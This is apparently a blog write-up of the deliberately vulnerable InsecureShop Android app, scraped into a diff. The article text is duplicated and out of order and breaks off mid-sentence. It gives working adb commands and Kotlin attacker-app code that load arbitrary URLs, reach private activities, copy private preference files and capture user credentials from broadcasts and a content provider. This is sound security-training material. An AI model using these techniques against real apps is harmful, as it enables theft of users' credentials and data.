@@ -1,1 +1,1047 @@
 
+Insufficient URL Validation
+We start by checking the AndroidManifest file where we notice that the activity WebViewActivity has the following content:
+<activity android:name=".WebViewActivity">
+    <intent-filter>
+        <action android:name="android.intent.action.VIEW" />
+        <category android:name="android.intent.category.DEFAULT" />
+        <category android:name="android.intent.category.BROWSABLE" />
+
+        <data
+            android:host="com.insecureshop"
+            android:scheme="insecureshop" />
+    </intent-filter>
+</activity>
+
+<activity android:name=".WebViewActivity">
+    <intent-filter>
+        <action android:name="android.intent.action.VIEW" />
+        <category android:name="android.intent.category.DEFAULT" />
+        <category android:name="android.intent.category.BROWSABLE" />
+
+        <data
+            android:host="com.insecureshop"
+            android:scheme="insecureshop" />
+    </intent-filter>
+</activity>
+
+Copy
+
+We make a note on the host and scheme presented here and we move on to find the corresponding class located here com/insecureshop/WebViewActivity.kt. The following lines immediately pop out from the onCreate function:
+if (uri.path.equals("/web")) {
+    data = intent.data?.getQueryParameter("url")
+
+[...]
+
+webview.loadUrl(data)
+
+
+
+
+
+
+Copy
+ There is a check to validate that the URI path is equal to /web and after that the parameter url is being extracted from an intent to a parameter named data which later is being loaded in a webview. This is really interesting as we can construct such a URI and pass an arbitrary parameter as a url. We are going to do that by using adb. More specifically we are going to call the activity manager from adb with a specified action and an intent URI. The following command does that.
+adb shell am start -W -a android.intent.action.VIEW -d "insecureshop://com.insecureshop/web?url=https://erev0s.com"
+
+ - am = activity manager
+ - start = Start an Activity specified by intent
+ - -W = wait for launch to complete
+ - -a = intent action
+ - -d = intent URI
+
+
+
+
+
+
+
+Copy
+ A short explanation was added for the flags used above as it is the first time we see them in this article and it will help in understanding how adb is used in this scenario. The attack is completed, the application loaded an arbitrary URL we passed to it.
+
+Weak Host Validation Check
+In the same activity as before we see that upon failing the first if statement if falls to the else if:
+} else if (uri.path.equals("/webview")) {
+    if (intent.data!!.getQueryParameter("url")!!.endsWith("insecureshopapp.com")) {
+        data = intent.data?.getQueryParameter("url")
+    }}
+
+
+
+
+Copy
+
+The validation on the host is by using the .endsWith method, which is insufficient for the task as any host ending with this is acceptable. An example is(notice the 'my-'):
+adb shell am start -W -a android.intent.action.VIEW -d "insecureshop://com.insecureshop/webview?url=http://my-insecureshopapp.com"
+
+Copy
+ Similar as before an arbitrary URL will be loaded to the webview due to the weak host validation.
+
+Intent Redirection (Access to Protected Components)
+One other activity that seems interesting is named PrivateActivity and based on it's definition in AndroidManifest we have:
+<activity android:name=".PrivateActivity" android:exported="false" />
+
+Copy
+ This is not exported so there is no way for another application to access it normally. Checking now the WebView2Activity as well we see the following code:
+val extraIntent = intent.getParcelableExtra<Intent>("extra_intent")
+if (extraIntent != null) {
+    startActivity(extraIntent)
+    finish()
+    return
+}
+
+
+
+
+
+
+Copy
+ That is very interesting as it seems that the activity takes an intent being passed in the extra part of another intent and uses that to start an activity. The extra intent being passed is not sanitized or filtered in any way, which means we could use this activity to pass an arbitrary intent which would then be used by the startActivity. That seems a perfect candidate to access the PrivateActivity we saw earlier which we could not access otherwise! This is the key to this attack, exploiting a mis-configuration in one activity to access another one. Checking further the content of the PrivateActivity we have:
+var data = intent.getStringExtra("url")
+if (data == null) {
+    data = "https://www.insecureshopapp.com"
+}
+webview.loadUrl(data)
+
+
+
+
+
+Copy
+ It is the same exploitation as the previous ones, where we pass an arbitrary URL to be loaded in the webview. For this attack we created another application which we will call "Attacking Application" from now on. This attacking application is installed in the same device as the InsecureShop and it has a button which when clicked it triggers the following code:
+fun intentRedirection(view: View) {
+    val extra = Intent()
+    extra.setClassName("com.insecureshop", "com.insecureshop.PrivateActivity")
+    extra.putExtra("url", "http://erev0s.com/")
+
+    val intent = Intent()
+    intent.setClassName("com.insecureshop", "com.insecureshop.WebView2Activity")
+    intent.putExtra("extra_intent", extra)
+    startActivity(intent)
+}
+
+
+
+
+
+
+
+
+
+
+Copy
+ The code is relatively simple, we first create an intent specifying the classname of the PrivateActivity which is our goal and we pass as extra field the url with our custom url to be loaded. Then we put this entire intent as the extra field of a second intent targeting the WebView2Activity.
+
+Unprotected Data URIs
+In the same activity we saw just before com/insecureshop/WebView2Activity.kt, the following lines caught our attention:
+if (!intent.dataString.isNullOrBlank()) {
+    webview.loadUrl(intent.dataString)
+} else if (!intent.data?.getQueryParameter("url").isNullOrBlank()) {
+    webview.loadUrl(intent.data?.getQueryParameter("url"))
+} else if(!intent.extras?.getString("url").isNullOrEmpty()){
+    webview.loadUrl(intent.extras?.getString("url"))
+}
+
+
+
+
+
+
+
+Copy
+ It is obvious that unsanitized data are being passed to the webview. Issuing a command similar to the one below can exploit this scenario:
+adb shell am start -n com.insecureshop/.WebView2Activity --es "url" "https://erev0s.com"
+
+Copy
+The above case since it is in the extras it will hit the third if in the code. It is also possible to hit the first if by passing the URI directly to the intent through the attacking app like the following:
+fun intentUnprotectedDataURIs(view: View) {
+    val intent = Intent()
+    intent.setData(Uri.parse("https://erev0s.com"))
+    intent.setClassName("com.insecureshop", "com.insecureshop.WebView2Activity")
+    startActivity(intent)
+}
+
+
+
+
+
+
+Copy
+
+Theft of Arbitrary files from LocalStorage
+The first thing to notice for this challenge is that you need to use a device with Android API < 30. This is important so you can opt out of scoped storage. You can find more information about it here.
+If you do not opt out of scoped storage you will not be able to write into the external storage! In order to fix this you will need to just add one line in the AndroidManifest of the app as follows:
+<application
+android:requestLegacyExternalStorage="true" ... >
+
+
+Copy
+ During our code inspection we see the function makeTempCopy in the ChooserActivity class, which takes a file defined from the property fileUri: Uri and creates a copy of it to the external storage where other applications also have the ability to read/write. In the onCreate of the same class we have the following lines:
+var uri = intent.getParcelableExtra<Parcelable>("android.intent.extra.STREAM") as Uri
+uri = Uri.fromFile(File(uri.toString()))
+makeTempCopy(uri, getFilename(uri))
+
+
+
+Copy
+ It essentially means that when the activity receives an Intent of type EXTRA_STREAM then it will invoke the makeTempCopy on it. This as you have guessed is a perfect candidate for a third application on the device to extract sensitive information from the InsecureShop, for which it would not have access otherwise.
+Lets imagine now that since we noticed that the app saves some sensitive information on shared_prefs/Prefs.xml we want to take advantage of the vulnerability above and extract it.
+The location of the Prefs.xml is /data/data/com.insecureshop/shared_prefs/Prefs.xml. So the following snippet can be used by the attacking app to perform the exploit:
+fun arbitraryFilesOnLocalStorage(view: View) {
+    val intent = Intent()
+    intent.putExtra(Intent.EXTRA_STREAM, Uri.parse("/data/data/com.insecureshop/shared_prefs/Prefs.xml"))
+    intent.setClassName("com.insecureshop", "com.insecureshop.ChooserActivity")
+    startActivity(intent)
+}
+
+
+
+
+
+
+Copy
+ The sensitive file will be copied to a location where all apps have access and therefore it will be exposed.
+
+Insecure Broadcast Receiver
+Inspecting the class AboutUsActivity we see the following code:
+lateinit var receiver: CustomReceiver
+
+override fun onCreate(savedInstanceState: Bundle?) {
+    super.onCreate(savedInstanceState)
+    setContentView(R.layout.activity_about_us)
+    receiver = CustomReceiver()
+    registerReceiver(receiver, IntentFilter("com.insecureshop.CUSTOM_INTENT"))
+}
+
+Copy
+ A receiver is being registered for the Intent com.insecureshop.CUSTOM_INTENT. The type of the receiver is CustomReceiver.
+Checking the CustomReceiver.kt we have the following:
+override fun onReceive(context: Context?, intent: Intent?) {
+    val stringExtra = intent?.extras?.getString("web_url")
+    if (!stringExtra.isNullOrBlank()) {
+        val intent = Intent(context, WebView2Activity::class.java)
+        intent.putExtra("url",stringExtra)
+        context?.startActivity(intent)
+    }
+}
+Copy
+ The web_url passed as extras to the intent is being used to start the WebView2Activity which as we saw earlier is vulnerable.
+So all we have to do to take advantage of this, is start the AboutUsActivity and then broadcast a properly formatted intent. This can be done by issuing the following two commands utilizing adb:
+adb shell am start -n com.insecureshop/.AboutUsActivity
+adb shell am broadcast -a com.insecureshop.CUSTOM_INTENT --es web_url "https://erev0s.com/"
+ Alternatively you could do the same from our attackign application. The following code in Kotlin covers it:
+fun insecureBroadcast(view: View) {
+    val intent = Intent()
+    intent.setClassName("com.insecureshop", "com.insecureshop.AboutUsActivity")
+    startActivity(intent)
+
+    Handler(Looper.getMainLooper()).postDelayed({delayedBroadcast()}, 1000)
+}
+
+private fun delayedBroadcast() {
+    val intent = Intent("com.insecureshop.CUSTOM_INTENT")
+    intent.putExtra("web_url", "https://erev0s.com/")
+    context?.sendBroadcast(intent)
+}
+
+Copy
+
+AWS Cognito Misconfiguration
+This vulnerability was particularly interesting and it needed a bit more analysis so it has it's own dedicated article here.
+Insecure use of FilePaths in FileProvider
+Insecure Implementation of SetResult in exported Activity
+These two vulnerabilities have been combined and a separate article was written about them, as chaining them has an interesting impact. You can check the article here.
+
+Use of Implicit intent to send a broadcast with sensitive data
+In the AboutUsActivity.kt we notice the following function:
+fun onSendData(view: View) {
+    val userName = Prefs.username!!
+    val password = Prefs.password!!
+
+    val intent = Intent("com.insecureshop.action.BROADCAST")
+    intent.putExtra("username", userName)
+    intent.putExtra("password", password)
+    sendBroadcast(intent)
+
+    textView.text = "InsecureShop is an intentionally designed vulnerable android app built in Kotlin."
+}
+
+
+
+
+
+
+
+
+
+
+
+Copy
+ As can be seen a broadcast is being created with the username and password of the user added as an extra field in the intent. This is an implicit intent which can be picked up by any receiver that has the same action defined. As of Android version O(API 26) there is a limitation to the receivers while they are on the background and there are two ways applications can receive implicit intents while staying in the background. The first way, which technically is not a solution is by setting the receiver in the AndroidManifest file and then specifying the target SDK to be 24 or lower, I say this is not a solution as when you are building an application and you aim to go for production then this would not cut it. The second way, which is also the proper way of doing it is by using a registerReceiver. The official documentation shows how this can be done.
+
+So basically in order to exploit this vulnerability we will need to create another application to install on the same device as the InsecureShop. On that attacking application we will need to create a receiver's class like the following:
+package com.erev0s.attackerinsecureshop
+
+import android.content.BroadcastReceiver
+import android.content.Context
+import android.content.Intent
+import android.util.Log
+
+open class MyReceiver : BroadcastReceiver() {
+
+    override fun onReceive(context: Context?, intent: Intent?) {
+        val gotname = intent?.getStringExtra("username") ?: return
+        val gotpass = intent?.getStringExtra("password") ?: return
+        Log.d("erev0s.com", ">>$gotname $gotpass")
+    }
+}
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+Copy
+ Then we need to simply add the following snippet on the onCreate of the MainActivity:
+val br: BroadcastReceiver = MyReceiver()
+val filter = IntentFilter("com.insecureshop.action.BROADCAST")
+registerReceiver(br, filter)
+
+
+
+Copy
+
+And then we can see in the logcat the following line:
+2021-10-16 13:25:39.164 4188-4188/com.erev0s.attackerinsecureshop D/erev0s.com: >>test test
+
+Copy
+
+Intercepting Implicit intent to load arbitrary URL
+In order to intercept an intent it has to be broadcasted first, so searching the InsecureShop for instances of sendBroadcast revealed the file ProductAdapter.kt where a broadcast is being created with the product url as soon as you click on the 'more info' button.
+The corresponding code is the following from the ProductAdapter.kt:
+holder.mBinding.moreInfo.setOnClickListener {
+    val intent = Intent("com.insecureshop.action.PRODUCT_DETAIL")
+    intent.putExtra("url", prodDetail.url)
+    context.sendBroadcast(intent)
+}
+
+
+
+
+
+Copy
+
+This intent is supposed to be received by the receiver registered at the file ProductListActivity.kt:
+val intentFilter = IntentFilter("com.insecureshop.action.PRODUCT_DETAIL")
+registerReceiver(productDetailBroadCast, intentFilter)
+val productAdapter = ProductAdapter()
+
+
+
+Copy
+
+Inspecting the class ProductDetailBroadCast which is the class of the receiver, has the following code:
+class ProductDetailBroadCast : BroadcastReceiver() {
+
+    override fun onReceive(context: Context?, intent: Intent?) {
+        val webViewIntent = Intent("com.insecureshop.action.WEBVIEW")
+        webViewIntent.putExtra("url","https://www.insecureshopapp.com/")
+        context?.startActivity(webViewIntent)
+    }
+}
+
+
+
+
+
+
+
+
+Copy
+
+It should be noted here that as can be seen on line 5, the parameter of the intent is hardcoded to be that of the webpage of InsecureShop. This does not seem logical as the products themselves have a url defined and beyond that it would not be possible to pass an arbitrary URL if it is hardcoded. For this reason I believe the author oversaw this and that is why this pull request was created.
+
+You could update that on your own by replacing the line above with:
+webViewIntent.putExtra("url", intent?.getStringExtra("url"))
+
+Copy
+ To exploit this, we have to first setup a receiver on our own that would get the broadcast and right after it would create an intent similar to the one above but with an arbitrary URL.
+We first create the receiver class:
+open class MyReceiver : BroadcastReceiver() {
+
+    override fun onReceive(context: Context?, intent: Intent?) {
+        val goturl = intent?.getStringExtra("url") ?: return
+        Log.d("erev0s.com", "Got the original intent's url: $goturl")
+        Log.d("erev0s.com", "Sending a new intent in it's place...")
+        val webViewIntent = Intent("com.insecureshop.action.WEBVIEW")
+        webViewIntent.putExtra("url", "https://erev0s.com")
+        webViewIntent.setPackage("com.insecureshop")
+        context?.startActivity(webViewIntent)
+
+        Log.d("erev0s.com", "Intent was sent")
+    }
+}
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+Copy
+
+Initially we extract the URL passed from the original intent just for logging purposes. Immediately after we create a new intent similar to the one defined in the ProductDetailBroadCast.kt file.
+In our MainActivity in the attacking application we register the receiver using registerReceiver:
+val br: BroadcastReceiver = MyReceiver()
+val filter = IntentFilter("com.insecureshop.action.PRODUCT_DETAIL")
+registerReceiver(br, filter)
+Log.d("erev0s.com", "Registered the Receiver")
+
+
+
+
+Copy
+
+As a final and important step we need to adjust a bit the AndroidManifest file and add an intent-filter to the MainActivity like so:
+<intent-filter android:priority="999">
+    <action android:name="com.insecureshop.action.PRODUCT_DETAIL" />
+</intent-filter>
+
+
+
+Copy
+
+There are two things to notice in this, the first being the android priority. which basically states that our MainActivity has priority in handling the broadcasted intent. The second this is the action, as it should be the exact same as the broadcasted intent.
+One thing to keep in mind is that our attacking application needs to be running in order for this interception to succeed. Otherwise the application will work like it should. The next short video shows that when we click on the "More Info" button initially then indeed the InsecureShop gets us to the correct page. Though, once the attacking app is started and then we click again on the "More Info" then the arbitrary URL we have defined is opening up.
+
+
+
+
+Insecure Content Provider
+One of the first things noticed in the AndroidManifest file of InsecureShop was the exported content provider:
+<provider
+    android:name=".contentProvider.InsecureShopProvider"
+    android:authorities="com.insecureshop.provider"
+    android:exported="true"
+    android:readPermission="com.insecureshop.permission.READ" />
+
+
+
+
+
+Copy
+ Besides the fact that is exported, the other two things we take from this snippet is the name and the permission it requires.
+In the file InsecureShopProvider.kt we see the following:
+if (uriMatcher?.match(uri) == URI_CODE) {
+    val cursor = MatrixCursor(arrayOf("username", "password"))
+    cursor.addRow(arrayOf<String>(Prefs.username!!, Prefs.password!!))
+    return cursor
+}
+
+
+
+
+
+Copy
+
+And on the onCreate we see the uriMatcher:
+uriMatcher?.addURI("com.insecureshop.provider", "insecure", URI_CODE)
+
+Copy
+
+So, this means that with the proper URI we will be able to access the username and the password of the content provider!
+The solution is relatively simple. Again using the attacking app we have, we utilize the dump function we created above in our MainActivity to dump the contacts from the FileProvider vulnerability and we pass it a proper URI. The following snippet shows this:
+fun insecureContentrovider() {
+    try {
+        val URL = "content://com.insecureshop.provider/insecure"
+        val data = Uri.parse(URL)
+        (activity as MainActivity).dump(data)
+    } catch (ex: Exception) {
+        ex.printStackTrace()
+    }
+}
+
+
+
+
+
+
+
+
+
+Copy
+
+Checking the logcat we see:
+2021-10-16 17:45:41.529 2936-2936/com.erev0s.attackerinsecureshop D/erev0s.com: username = test, password = test
+
+Copy
+ 
+
+Conclusion
+InsecureShop has a lot of interesting vulnerabilities and can be effectively used for learning purposes. I hope that the solutions above can contribute to the le
+erev0s
+		  HOME   BLOG   TOOLS   CONTACT
+InsecureShop Write-up, all vulnerabilities explained
+A full write-up for the InsecureSHop application, to serve for learning purposes
+
+
+ Sun 17 Oct 2021
+  
+	•	 /Writeups  /Android
+  InsecureShop is an Android application written in Kotlin that is designed to be intentionally vulnerable. It is a great asset for enthusiasts of Android security as it incorporates many common real life vulnerabilities. This is the third article about InsecureShop, where this time we will not just explain a vulnerability but we will see the most important ones that are offered. The full list of vulnerabilities covered are the following:
+	1	Insufficient URL Validation
+	2	Weak Host Validation Check
+	3	Intent Redirection (Access to Protected Components)
+	4	Unprotected Data URIs
+	5	Theft of Arbitrary files from LocalStorage
+	6	Insecure Broadcast Receiver
+	7	AWS Cognito Misconfiguration
+	8	Insecure use of FilePaths in FileProvider
+	9	Insecure Implementation of SetResult in exported Activity
+	10	Use of Implicit intent to send a broadcast with sensitive data
+	11	Intercepting Implicit intent to load arbitrary URL
+	12	Insecure Content Provider
+
+There are more vulnerabilities within the app but they are either rather trivial to exploit or they require to check only the code of the app like for example insecure logging, where it has to be noticed that sensitive data are being leaked to logcat. It is suggested that you try to exploit the vulnerabilities on your own before proceeding with the solutions. A note should be made regarding our approach in the solutions provided. Some of the vulnerabilities can be exploited using ADB, while others require from you to create another app, which will be installed on the same device. We will not describe step by step how you can create another app, as this is outside of the scope of this write-up, we will only provide the necessary functions and snippets required for a working solution.
+
+Insufficient URL Validation
+We start by checking the AndroidManifest file where we notice that the activity WebViewActivity has the following content:
+<activity android:name=".WebViewActivity">
+    <intent-filter>
+        <action android:name="android.intent.action.VIEW" />
+        <category android:name="android.intent.category.DEFAULT" />
+        <category android:name="android.intent.category.BROWSABLE" />
+
+        <data
+            android:host="com.insecureshop"
+            android:scheme="insecureshop" />
+    </intent-filter>
+</activity>
+
+
+
+
+
+
+
+
+
+
+
+Copy
+
+We make a note on the host and scheme presented here and we move on to find the corresponding class located here com/insecureshop/WebViewActivity.kt. The following lines immediately pop out from the onCreate function:
+if (uri.path.equals("/web")) {
+    data = intent.data?.getQueryParameter("url")
+
+[...]
+
+webview.loadUrl(data)
+
+
+
+
+
+
+Copy
+ There is a check to validate that the URI path is equal to /web and after that the parameter url is being extracted from an intent to a parameter named data which later is being loaded in a webview. This is really interesting as we can construct such a URI and pass an arbitrary parameter as a url. We are going to do that by using adb. More specifically we are going to call the activity manager from adb with a specified action and an intent URI. The following command does that.
+adb shell am start -W -a android.intent.action.VIEW -d "insecureshop://com.insecureshop/web?url=https://erev0s.com"
+
+ - am = activity manager
+ - start = Start an Activity specified by intent
+ - -W = wait for launch to complete
+ - -a = intent action
+ - -d = intent URI
+
+
+
+
+
+
+
+Copy
+ A short explanation was added for the flags used above as it is the first time we see them in this article and it will help in understanding how adb is used in this scenario. The attack is completed, the application loaded an arbitrary URL we passed to it.
+
+Weak Host Validation Check
+In the same activity as before we see that upon failing the first if statement if falls to the else if:
+} else if (uri.path.equals("/webview")) {
+    if (intent.data!!.getQueryParameter("url")!!.endsWith("insecureshopapp.com")) {
+        data = intent.data?.getQueryParameter("url")
+    }}
+
+
+
+
+Copy
+
+The validation on the host is by using the .endsWith method, which is insufficient for the task as any host ending with this is acceptable. An example is(notice the 'my-'):
+adb shell am start -W -a android.intent.action.VIEW -d "insecureshop://com.insecureshop/webview?url=http://my-insecureshopapp.com"
+
+Copy
+ Similar as before an arbitrary URL will be loaded to the webview due to the weak host validation.
+
+Intent Redirection (Access to Protected Components)
+One other activity that seems interesting is named PrivateActivity and based on it's definition in AndroidManifest we have:
+<activity android:name=".PrivateActivity" android:exported="false" />
+
+Copy
+ This is not exported so there is no way for another application to access it normally. Checking now the WebView2Activity as well we see the following code:
+val extraIntent = intent.getParcelableExtra<Intent>("extra_intent")
+if (extraIntent != null) {
+    startActivity(extraIntent)
+    finish()
+    return
+}
+
+
+
+
+
+
+Copy
+ That is very interesting as it seems that the activity takes an intent being passed in the extra part of another intent and uses that to start an activity. The extra intent being passed is not sanitized or filtered in any way, which means we could use this activity to pass an arbitrary intent which would then be used by the startActivity. That seems a perfect candidate to access the PrivateActivity we saw earlier which we could not access otherwise! This is the key to this attack, exploiting a mis-configuration in one activity to access another one. Checking further the content of the PrivateActivity we have:
+var data = intent.getStringExtra("url")
+if (data == null) {
+    data = "https://www.insecureshopapp.com"
+}
+webview.loadUrl(data)
+
+
+
+
+
+Copy
+ It is the same exploitation as the previous ones, where we pass an arbitrary URL to be loaded in the webview. For this attack we created another application which we will call "Attacking Application" from now on. This attacking application is installed in the same device as the InsecureShop and it has a button which when clicked it triggers the following code:
+fun intentRedirection(view: View) {
+    val extra = Intent()
+    extra.setClassName("com.insecureshop", "com.insecureshop.PrivateActivity")
+    extra.putExtra("url", "http://erev0s.com/")
+
+    val intent = Intent()
+    intent.setClassName("com.insecureshop", "com.insecureshop.WebView2Activity")
+    intent.putExtra("extra_intent", extra)
+    startActivity(intent)
+}
+
+
+
+
+
+
+
+
+
+
+Copy
+ The code is relatively simple, we first create an intent specifying the classname of the PrivateActivity which is our goal and we pass as extra field the url with our custom url to be loaded. Then we put this entire intent as the extra field of a second intent targeting the WebView2Activity.
+
+Unprotected Data URIs
+In the same activity we saw just before com/insecureshop/WebView2Activity.kt, the following lines caught our attention:
+if (!intent.dataString.isNullOrBlank()) {
+    webview.loadUrl(intent.dataString)
+} else if (!intent.data?.getQueryParameter("url").isNullOrBlank()) {
+    webview.loadUrl(intent.data?.getQueryParameter("url"))
+} else if(!intent.extras?.getString("url").isNullOrEmpty()){
+    webview.loadUrl(intent.extras?.getString("url"))
+}
+
+
+
+
+
+
+
+Copy
+ It is obvious that unsanitized data are being passed to the webview. Issuing a command similar to the one below can exploit this scenario:
+adb shell am start -n com.insecureshop/.WebView2Activity --es "url" "https://erev0s.com"
+
+Copy
+The above case since it is in the extras it will hit the third if in the code. It is also possible to hit the first if by passing the URI directly to the intent through the attacking app like the following:
+fun intentUnprotectedDataURIs(view: View) {
+    val intent = Intent()
+    intent.setData(Uri.parse("https://erev0s.com"))
+    intent.setClassName("com.insecureshop", "com.insecureshop.WebView2Activity")
+    startActivity(intent)
+}
+
+
+
+
+
+
+Copy
+
+Theft of Arbitrary files from LocalStorage
+The first thing to notice for this challenge is that you need to use a device with Android API < 30. This is important so you can opt out of scoped storage. You can find more information about it here.
+If you do not opt out of scoped storage you will not be able to write into the external storage! In order to fix this you will need to just add one line in the AndroidManifest of the app as follows:
+<application
+android:requestLegacyExternalStorage="true" ... >
+
+
+Copy
+ During our code inspection we see the function makeTempCopy in the ChooserActivity class, which takes a file defined from the property fileUri: Uri and creates a copy of it to the external storage where other applications also have the ability to read/write. In the onCreate of the same class we have the following lines:
+var uri = intent.getParcelableExtra<Parcelable>("android.intent.extra.STREAM") as Uri
+uri = Uri.fromFile(File(uri.toString()))
+makeTempCopy(uri, getFilename(uri))
+
+
+
+Copy
+ It essentially means that when the activity receives an Intent of type EXTRA_STREAM then it will invoke the makeTempCopy on it. This as you have guessed is a perfect candidate for a third application on the device to extract sensitive information from the InsecureShop, for which it would not have access otherwise.
+Lets imagine now that since we noticed that the app saves some sensitive information on shared_prefs/Prefs.xml we want to take advantage of the vulnerability above and extract it.
+The location of the Prefs.xml is /data/data/com.insecureshop/shared_prefs/Prefs.xml. So the following snippet can be used by the attacking app to perform the exploit:
+fun arbitraryFilesOnLocalStorage(view: View) {
+    val intent = Intent()
+    intent.putExtra(Intent.EXTRA_STREAM, Uri.parse("/data/data/com.insecureshop/shared_prefs/Prefs.xml"))
+    intent.setClassName("com.insecureshop", "com.insecureshop.ChooserActivity")
+    startActivity(intent)
+}
+
+
+
+
+
+
+Copy
+ The sensitive file will be copied to a location where all apps have access and therefore it will be exposed.
+
+Insecure Broadcast Receiver
+Inspecting the class AboutUsActivity we see the following code:
+lateinit var receiver: CustomReceiver
+
+override fun onCreate(savedInstanceState: Bundle?) {
+    super.onCreate(savedInstanceState)
+    setContentView(R.layout.activity_about_us)
+    receiver = CustomReceiver()
+    registerReceiver(receiver, IntentFilter("com.insecureshop.CUSTOM_INTENT"))
+}
+
+
+
+
+
+
+
+
+Copy
+ A receiver is being registered for the Intent com.insecureshop.CUSTOM_INTENT. The type of the receiver is CustomReceiver.
+Checking the CustomReceiver.kt we have the following:
+override fun onReceive(context: Context?, intent: Intent?) {
+    val stringExtra = intent?.extras?.getString("web_url")
+    if (!stringExtra.isNullOrBlank()) {
+        val intent = Intent(context, WebView2Activity::class.java)
+        intent.putExtra("url",stringExtra)
+        context?.startActivity(intent)
+    }
+}
+
+
+
+
+
+
+
+
+Copy
+ The web_url passed as extras to the intent is being used to start the WebView2Activity which as we saw earlier is vulnerable.
+So all we have to do to take advantage of this, is start the AboutUsActivity and then broadcast a properly formatted intent. This can be done by issuing the following two commands utilizing adb:
+adb shell am start -n com.insecureshop/.AboutUsActivity
+adb shell am broadcast -a com.insecureshop.CUSTOM_INTENT --es web_url "https://erev0s.com/"
+
+
+Copy
+
+ Alternatively you could do the same from our attackign application. The following code in Kotlin covers it:
+fun insecureBroadcast(view: View) {
+    val intent = Intent()
+    intent.setClassName("com.insecureshop", "com.insecureshop.AboutUsActivity")
+    startActivity(intent)
+
+    Handler(Looper.getMainLooper()).postDelayed({delayedBroadcast()}, 1000)
+}
+
+private fun delayedBroadcast() {
+    val intent = Intent("com.insecureshop.CUSTOM_INTENT")
+    intent.putExtra("web_url", "https://erev0s.com/")
+    context?.sendBroadcast(intent)
+}
+
+
+
+
+
+
+
+
+
+
+
+
+
+Copy
+
+AWS Cognito Misconfiguration
+This vulnerability was particularly interesting and it needed a bit more analysis so it has it's own dedicated article here.
+
+Insecure use of FilePaths in FileProvider
+Insecure Implementation of SetResult in exported Activity
+These two vulnerabilities have been combined and a separate article was written about them, as chaining them has an interesting impact. You can check the article here.
+
+Use of Implicit intent to send a broadcast with sensitive data
+In the AboutUsActivity.kt we notice the following function:
+fun onSendData(view: View) {
+    val userName = Prefs.username!!
+    val password = Prefs.password!!
+
+    val intent = Intent("com.insecureshop.action.BROADCAST")
+    intent.putExtra("username", userName)
+    intent.putExtra("password", password)
+    sendBroadcast(intent)
+
+    textView.text = "InsecureShop is an intentionally designed vulnerable android app built in Kotlin."
+}
+
+
+
+
+
+
+
+
+
+
+
+Copy
+ As can be seen a broadcast is being created with the username and password of the user added as an extra field in the intent. This is an implicit intent which can be picked up by any receiver that has the same action defined. As of Android version O(API 26) there is a limitation to the receivers while they are on the background and there are two ways applications can receive implicit intents while staying in the background. The first way, which technically is not a solution is by setting the receiver in the AndroidManifest file and then specifying the target SDK to be 24 or lower, I say this is not a solution as when you are building an application and you aim to go for production then this would not cut it. The second way, which is also the proper way of doing it is by using a registerReceiver. The official documentation shows how this can be done.
+
+So basically in order to exploit this vulnerability we will need to create another application to install on the same device as the InsecureShop. On that attacking application we will need to create a receiver's class like the following:
+package com.erev0s.attackerinsecureshop
+
+import android.content.BroadcastReceiver
+import android.content.Context
+import android.content.Intent
+import android.util.Log
+
+open class MyReceiver : BroadcastReceiver() {
+
+    override fun onReceive(context: Context?, intent: Intent?) {
+        val gotname = intent?.getStringExtra("username") ?: return
+        val gotpass = intent?.getStringExtra("password") ?: return
+        Log.d("erev0s.com", ">>$gotname $gotpass")
+    }
+}
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+Copy
+ Then we need to simply add the following snippet on the onCreate of the MainActivity:
+val br: BroadcastReceiver = MyReceiver()
+val filter = IntentFilter("com.insecureshop.action.BROADCAST")
+registerReceiver(br, filter)
+
+
+
+Copy
+
+And then we can see in the logcat the following line:
+2021-10-16 13:25:39.164 4188-4188/com.erev0s.attackerinsecureshop D/erev0s.com: >>test test
+
+Copy
+
+Intercepting Implicit intent to load arbitrary URL
+In order to intercept an intent it has to be broadcasted first, so searching the InsecureShop for instances of sendBroadcast revealed the file ProductAdapter.kt where a broadcast is being created with the product url as soon as you click on the 'more info' button.
+The corresponding code is the following from the ProductAdapter.kt:
+holder.mBinding.moreInfo.setOnClickListener {
+    val intent = Intent("com.insecureshop.action.PRODUCT_DETAIL")
+    intent.putExtra("url", prodDetail.url)
+    context.sendBroadcast(intent)
+}
+
+
+
+
+
+Copy
+
+This intent is supposed to be received by the receiver registered at the file ProductListActivity.kt:
+val intentFilter = IntentFilter("com.insecureshop.action.PRODUCT_DETAIL")
+registerReceiver(productDetailBroadCast, intentFilter)
+val productAdapter = ProductAdapter()
+
+
+
+Copy
+
+Inspecting the class ProductDetailBroadCast which is the class of the receiver, has the following code:
+class ProductDetailBroadCast : BroadcastReceiver() {
+
+    override fun onReceive(context: Context?, intent: Intent?) {
+        val webViewIntent = Intent("com.insecureshop.action.WEBVIEW")
+        webViewIntent.putExtra("url","https://www.insecureshopapp.com/")
+        context?.startActivity(webViewIntent)
+    }
+}
+
+
+
+
+
+
+
+
+Copy
+
+It should be noted here that as can be seen on line 5, the parameter of the intent is hardcoded to be that of the webpage of InsecureShop. This does not seem logical as the products themselves have a url defined and beyond that it would not be possible to pass an arbitrary URL if it is hardcoded. For this reason I believe the author oversaw this and that is why this pull request was created.
+
+You could update that on your own by replacing the line above with:
+webViewIntent.putExtra("url", intent?.getStringExtra("url"))
+
+Copy
+ To exploit this, we have to first setup a receiver on our own that would get the broadcast and right after it would create an intent similar to the one above but with an arbitrary URL.
+We first create the receiver class:
+open class MyReceiver : BroadcastReceiver() {
+
+    override fun onReceive(context: Context?, intent: Intent?) {
+        val goturl = intent?.getStringExtra("url") ?: return
+        Log.d("erev0s.com", "Got the original intent's url: $goturl")
+        Log.d("erev0s.com", "Sending a new intent in it's place...")
+        val webViewIntent = Intent("com.insecureshop.action.WEBVIEW")
+        webViewIntent.putExtra("url", "https://erev0s.com")
+        webViewIntent.setPackage("com.insecureshop")
+        context?.startActivity(webViewIntent)
+
+        Log.d("erev0s.com", "Intent was sent")
+    }
+}
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+Copy
+
+Initially we extract the URL passed from the original intent just for logging purposes. Immediately after we create a new intent similar to the one defined in the ProductDetailBroadCast.kt file.
+In our MainActivity in the attacking application we register the receiver using registerReceiver:
+val br: BroadcastReceiver = MyReceiver()
+val filter = IntentFilter("com.insecureshop.action.PRODUCT_DETAIL")
+registerReceiver(br, filter)
+Log.d("erev0s.com", "Registered the Receiver")
+
+
+
+
+Copy
+
+As a final and important step we need to adjust a bit the AndroidManifest file and add an intent-filter to the MainActivity like so:
+<intent-filter android:priority="999">
